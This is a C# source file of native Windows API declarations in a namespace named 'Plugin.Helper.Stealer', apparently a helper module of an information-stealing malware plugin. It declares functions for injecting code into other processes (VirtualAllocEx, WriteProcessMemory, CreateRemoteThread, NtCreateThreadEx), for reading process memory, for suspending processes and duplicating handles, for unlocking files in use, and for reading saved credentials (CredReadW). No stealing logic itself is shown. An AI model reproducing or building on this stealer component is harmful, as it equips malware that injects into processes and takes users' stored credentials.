

using System;
using System.Runtime.InteropServices;
using System.Text;


namespace Plugin.Helper.Stealer
{
	public static class NativeMethods
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr processHandle,
			int processInformationClass,
			ref InternalStructs.ParentProcessUtilities processInformation,
			int processInformationLength,
			out int returnLength);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool QueryFullProcessImageName(
			IntPtr hProcess,
			uint dwFlags,
			[MarshalAs(UnmanagedType.LPTStr)] StringBuilder lpExeName,
			ref uint lpdwSize);

		[DllImport("ntdll.dll")]
		public static extern uint NtSuspendProcess(IntPtr ProcessHandle);

		[DllImport("ntdll.dll")]
		public static extern uint NtResumeProcess(IntPtr ProcessHandle);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern uint GetFinalPathNameByHandle(
			IntPtr hFile,
			[MarshalAs(UnmanagedType.LPTStr)] StringBuilder lpszFilePath,
			uint cchFilePath,
			uint dwFlags);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr CreateFileMapping(
			IntPtr hFile,
			IntPtr lpAttributes,
			uint flProtect,
			uint dwMaximumSizeHigh,
			uint dwMaximumSizeLow,
			string lpName);

		[DllImport("kernel32", SetLastError = true)]
		public static extern IntPtr MapViewOfFile(
			IntPtr hFileMappingObject,
			uint dwDesiredAccess,
			uint dwFileOffsetHigh,
			uint dwFileOffsetLow,
			uint dwNumberOfBytesToMap);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(
			uint dwDesiredAccess,
			bool bInheritHandle,
			uint dwProcessId);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hProcess);

		[DllImport("Kernel32.dll")]
		public static extern bool VirtualProtect(
			IntPtr lpAddress,
			UIntPtr dwSize,
			uint flNewProtect,
			out uint lpflOldProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			uint dwDesiredAccess,
			bool bInheritHandle,
			uint dwOptions);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool ReadProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UIntPtr dwSize,
			ref UIntPtr lpNumberOfBytesRead);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetCurrentProcessId();

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetThreadId(IntPtr Thread);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint SuspendThread(IntPtr Thread);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint ResumeThread(IntPtr Thread);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetCurrentThreadId();

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtGetNextThread(
			IntPtr ProcessHandle,
			IntPtr ThreadHandle,
			uint DesiredAccess,
			uint HandleAttributes,
			uint Flags,
			out IntPtr NewThreadHandle);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern void SetLastError(uint dwErrCode);

		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
		public static extern int memcmp(byte[] b1, byte[] b2, UIntPtr count);

		[DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", SetLastError = true)]
		private static extern int _NtQueryPbi32(
			IntPtr ProcessHandle,
			InternalStructs.PROCESSINFOCLASS ProcessInformationClass,
			ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation,
			uint BufferSize,
			ref uint NumberOfBytesRead);

		public static int NtQueryPbi32(
			IntPtr ProcessHandle,
			InternalStructs.PROCESSINFOCLASS ProcessInformationClass,
			ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation,
			uint BufferSize,
			ref uint NumberOfBytesRead)
		{
			int num = NativeMethods._NtQueryPbi32(ProcessHandle, ProcessInformationClass, ref ProcessInformation, BufferSize, ref NumberOfBytesRead);
			if (!Environment.Is64BitProcess)
				return num;
			ProcessInformation.PebBaseAddress += Environment.SystemPageSize;
			return num;
		}

		[DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", SetLastError = true)]
		public static extern int NtQueryPbi64From64(
			IntPtr ProcessHandle,
			InternalStructs.PROCESSINFOCLASS ProcessInformationClass,
			ref InternalStructs.PROCESS_BASIC_INFORMATION ProcessInformation,
			uint BufferSize,
			ref uint NumberOfBytesRead);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool IsProcessCritical(IntPtr hProcess, out bool Critical);

		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr CreateRemoteThread(
			IntPtr hProcess,
			IntPtr lpThreadAttributes,
			uint dwStackSize,
			IntPtr lpStartAddress,
			IntPtr lpParameter,
			uint dwCreationFlags,
			out IntPtr lpThreadId);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			UIntPtr dwSize,
			uint flAllocationType,
			uint flProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UIntPtr dwSize,
			uint flAllocationType,
			uint flProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool VirtualFreeEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UIntPtr dwSize,
			uint dwFreeType);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			IntPtr nSize,
			out IntPtr lpNumberOfBytesWritten);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr LoadLibraryW(string LibraryName);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool FreeLibrary(IntPtr hLibModule);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hmodule, string procName);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr GetModuleHandleW(string lpModuleName);

		[DllImport("kernel32.dll")]
		public static extern InternalStructs.FileType GetFileType(IntPtr hFile);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint GetFinalPathNameByHandleW(
			IntPtr hFile,
			[MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpszFilePath,
			uint cchFilePath,
			uint dwFlags);

		[DllImport("kernel32.dll")]
		public static extern void CopyMemory(IntPtr dest, IntPtr src, UIntPtr count);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtSuspendThread(IntPtr ThreadHandle, IntPtr PreviousSuspendCount);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtResumeThread(IntPtr ThreadHandle, IntPtr SuspendCount);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtCreateThreadEx(
			ref IntPtr threadHandle,
			uint desiredAccess,
			IntPtr objectAttributes,
			IntPtr processHandle,
			IntPtr startAddress,
			IntPtr parameter,
			bool inCreateSuspended,
			int stackZeroBits,
			int sizeOfStack,
			int maximumStackSize,
			IntPtr attributeList);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern uint GetProcessIdOfThread(IntPtr handle);

		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle,
			uint DesiredAccess,
			out IntPtr TokenHandle);

		[DllImport("advapi32.dll", SetLastError = true)]
		public static extern bool GetTokenInformation(
			IntPtr TokenHandle,
			int TokenInformationClass,
			IntPtr TokenInformation,
			int TokenInformationLength,
			out int ReturnLength);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool QueryFullProcessImageNameW(
			IntPtr hProcess,
			uint dwFlags,
			[MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpExeName,
			ref uint lpdwSize);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
		public static extern IntPtr CreateFileMappingA(
			IntPtr hFile,
			IntPtr lpFileMappingAttributes,
			uint flProtect,
			uint dwMaximumSizeHigh,
			uint dwMaximumSizeLow,
			string lpName);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetFileSizeEx(IntPtr hFile, out ulong FileSize);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr MapViewOfFile(
			IntPtr hFileMappingObject,
			uint dwDesiredAccess,
			uint dwFileOffsetHigh,
			uint dwFileOffsetLow,
			UIntPtr dwNumberOfBytesToMap);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern uint NtQuerySystemInformation(
			InternalStructs.SYSTEM_INFORMATION_CLASS SystemInformationClass,
			IntPtr SystemInformation,
			uint SystemInformationLength,
			out uint ReturnLength);

		[DllImport("kernel32.dll")]
		public static extern bool AllocConsole();

		[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint RmRegisterResources(
			uint dwSessionHandle,
			uint nFiles,
			string[] rgsFileNames,
			uint nApplications,
			InternalStructs.RM_UNIQUE_PROCESS[] rgApplications,
			uint nServices,
			string[] rgsServiceNames);

		[DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern uint RmStartSession(
			out uint pSessionHandle,
			uint dwSessionFlags,
			string strSessionKey);

		[DllImport("rstrtmgr.dll", SetLastError = true)]
		public static extern uint RmEndSession(uint pSessionHandle);

		[DllImport("rstrtmgr.dll", SetLastError = true)]
		public static extern uint RmGetList(
			uint dwSessionHandle,
			out uint pnProcInfoNeeded,
			ref uint pnProcInfo,
			[In, Out] InternalStructs.RM_PROCESS_INFO[] rgAffectedApps,
			out InternalStructs.RM_REBOOT_REASON lpdwRebootReasons);

		[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool CredReadW(
			string target,
			InternalStructs.CRED_TYPE type,
			int reservedFlag,
			out IntPtr credentialPtr);

		[DllImport("advapi32.dll")]
		public static extern void CredFree(IntPtr credentialPtr);
	}
}
